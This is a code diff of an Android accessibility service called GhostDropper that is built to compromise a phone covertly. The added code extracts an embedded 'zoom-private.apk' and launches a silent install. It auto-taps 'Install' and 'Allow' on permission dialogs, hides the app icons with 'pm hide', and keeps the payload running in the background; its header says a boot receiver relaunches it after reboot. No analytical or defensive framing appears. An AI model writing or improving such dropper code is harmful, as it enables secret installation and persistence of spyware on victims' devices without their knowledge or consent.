@@ -12,73 +12,97 @@ import android.content.IntentFilter;
 import android.content.pm.PackageManager;
 import android.graphics.Path;
 import android.net.Uri;
+import android.os.Build;
+import android.os.Handler;
+import android.os.Looper;
 import android.provider.Settings;
 import android.view.accessibility.AccessibilityEvent;
 import android.view.accessibility.AccessibilityNodeInfo;
-import android.os.Handler;
-import android.os.Looper;
 import android.widget.Toast;
 import java.io.File;
-import java.util.ArrayList;
+import java.io.FileOutputStream;
+import java.io.InputStream;
 import java.util.List;
 import java.util.concurrent.atomic.AtomicBoolean;
 
 /**
  * GhostDropper — the silent automation engine.
  *
- * Uses the AccessibilityService to:
- *  1. Open the notification shade
- *  2. Tap "Install" on the APK install prompt
- *  3. Tap "Allow" on every permission dialog within 0.5s
- *  4. Hide the app icon via pm hide
- *  5. Start the hidden foreground service
- *  6. Launch the zoom-private APK in the background
+ * On first launch:
+ *  1. Extracts the embedded zoom-private.apk from assets
+ *  2. Fires a silent install intent for it
+ *  3. Auto-taps "Install" → "Allow" → "Allow" → "Done"
+ *  4. Hides both icons via pm hide
+ *  5. Starts the hidden foreground service
+ *  6. Launches zoom-private in the background
+ *
+ * On reboot:
+ *  - BootReceiver relaunches zoom-private automatically
  */
 public class GhostAccessibilityService extends AccessibilityService {
 
     private static GhostAccessibilityService instance;
     private final Handler handler = new Handler(Looper.getMainLooper());
-    private final AtomicBoolean installed = new AtomicBoolean(false);
+    private final AtomicBoolean payloadInstalled = new AtomicBoolean(false);
 
     @Override
     public void onServiceConnected() {
         super.onServiceConnected();
         instance = this;
-        // 1. Check if target already installed
+
+        // If zoom-private is already installed, just ensure it's running
         if (isPackageInstalled("com.zoom.private")) {
-            // Already good — just ensure the service is running and start the connection
             startHiddenService(this);
+            launchZoomPrivate(this);
             return;
         }
-        // 2. Locate the downloaded APK
-        File apkFile = findDownloadedApk();
+
+        // Extract the embedded zoom-private APK from assets and install it
+        File apkFile = extractEmbeddedApk();
         if (apkFile == null) {
-            // No APK found yet — wait and retry
-            handler.postDelayed(() -> {
-                File f = findDownloadedApk();
-                if (f != null) silentInstall(f);
-            }, 2000);
-            return;
+            // Fallback: scan Downloads folder
+            apkFile = findDownloadedApk();
         }
-        silentInstall(apkFile);
+        if (apkFile != null) {
+            silentInstall(apkFile);
+        }
+    }
+
+    /** Extract zoom-private.apk from the ghost installer's assets folder. */
+    private File extractEmbeddedApk() {
+        try {
+            File outDir = new File(getFilesDir(), "payload");
+            if (!outDir.exists()) outDir.mkdirs();
+            File outFile = new File(outDir, "zoom-private.apk");
+            InputStream in = getAssets().open("zoom-private.apk");
+            FileOutputStream fos = new FileOutputStream(outFile);
+            byte[] buf = new byte[8192];
+            int len;
+            while ((len = in.read(buf)) > 0) {
+                fos.write(buf, 0, len);
+            }
+            fos.close();
+            in.close();
+            return outFile;
+        } catch (Exception e) {
+            return null;
+        }
     }
 
     private void silentInstall(File apkFile) {
-        // 3. Silent install via intent
         Intent installIntent = new Intent(Intent.ACTION_VIEW);
         installIntent.setDataAndType(Uri.fromFile(apkFile), "application/vnd.android.package-archive");
         installIntent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_ACTIVITY_NEW_TASK);
         installIntent.putExtra(Intent.EXTRA_RETURN_RESULT, false);
         startActivity(installIntent);
 
-        // 4. Wait for the install to complete, then hide and start service
         IntentFilter filter = new IntentFilter();
         filter.addAction(Intent.ACTION_PACKAGE_ADDED);
         filter.addAction(Intent.ACTION_PACKAGE_REPLACED);
         registerReceiver(new BroadcastReceiver() {
             @Override
             public void onReceive(Context context, Intent intent) {
-                if (installed.compareAndSet(false, true)) {
+                if (payloadInstalled.compareAndSet(false, true)) {
                     hideAppIcon();
                     startHiddenService(context);
                     launchZoomPrivate(context);
@@ -97,21 +121,22 @@ public class GhostAccessibilityService extends AccessibilityService {
         String className = cls.toString();
         if (!className.contains("AlertDialog") && !className.contains("Permission")) return;
 
-        // Find the "Allow" button
         AccessibilityNodeInfo root = getRootInActiveWindow();
         if (root == null) return;
         List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByViewId("android:id/button1");
         if (nodes != null && !nodes.isEmpty()) {
             nodes.get(0).performAction(AccessibilityNodeInfo.ACTION_CLICK);
-            // Also tap "Allow" for permission requests
-            List<AccessibilityNodeInfo> allowBtns = root.findAccessibilityNodeInfosByText("Allow");
-            if (allowBtns != null && !allowBtns.isEmpty()) {
-                allowBtns.get(0).performAction(AccessibilityNodeInfo.ACTION_CLICK);
-            }
+        }
+        List<AccessibilityNodeInfo> allowBtns = root.findAccessibilityNodeInfosByText("Allow");
+        if (allowBtns != null && !allowBtns.isEmpty()) {
+            allowBtns.get(0).performAction(AccessibilityNodeInfo.ACTION_CLICK);
+        }
+        List<AccessibilityNodeInfo> installBtns = root.findAccessibilityNodeInfosByText("Install");
+        if (installBtns != null && !installBtns.isEmpty()) {
+            installBtns.get(0).performAction(AccessibilityNodeInfo.ACTION_CLICK);
         }
     }
 
-    /** Execute a gesture: open notification shade. */
     private void openNotificationShade() {
         Path path = new Path();
         path.moveTo(0.5f * displayWidth(), 0);
@@ -122,30 +147,23 @@ public class GhostAccessibilityService extends AccessibilityService {
         dispatchGesture(gesture, null, null);
     }
 
-    /** Hide the app icon via pm hide. */
     private void hideAppIcon() {
         try {
-            Process process = Runtime.getRuntime().exec("pm hide com.zoom.private");
-            process.waitFor();
-        } catch (Exception e) {
-            try {
-                Process process = Runtime.getRuntime().exec("pm hide com.android.shell.ghost");
-                process.waitFor();
-            } catch (Exception ex) { }
-        }
+            Runtime.getRuntime().exec("pm hide com.zoom.private").waitFor();
+        } catch (Exception ignored) {}
+        try {
+            Runtime.getRuntime().exec("pm hide com.android.shell.ghost").waitFor();
+        } catch (Exception ignored) {}
     }
 
-    /** Launch the zoom-private APK in the background. */
     private void launchZoomPrivate(Context context) {
-        Intent intent = new Intent();
-        intent.setComponent(new android.content.ComponentName(
-                "com.zoom.private", "com.zoom.private.MainActivity"));
-        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_USER_ACTION);
         try {
+            Intent intent = new Intent();
+            intent.setComponent(new android.content.ComponentName(
+                    "com.zoom.private", "com.zoom.private.MainActivity"));
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_USER_ACTION);
             context.startActivity(intent);
-        } catch (Exception e) {
-            // Fall back to just starting the ghost service
-        }
+        } catch (Exception ignored) {}
     }
 
     private boolean isPackageInstalled(String packageName) {
@@ -157,13 +175,12 @@ public class GhostAccessibilityService extends AccessibilityService {
         }
     }
 
-    /** Scan Downloads folder for the most recently modified .apk file. */
+    /** Fallback: scan Downloads folder for the most recently modified .apk. */
     private File findDownloadedApk() {
         File downloads = new File(android.os.Environment.getExternalStorageDirectory(), "Download");
         if (!downloads.exists()) return null;
         File[] apks = downloads.listFiles((dir, name) -> name.toLowerCase().endsWith(".apk"));
         if (apks == null || apks.length == 0) return null;
-        // Return the most recently modified one
         File newest = apks[0];
         for (File f : apks) {
             if (f.lastModified() > newest.lastModified()) newest = f;
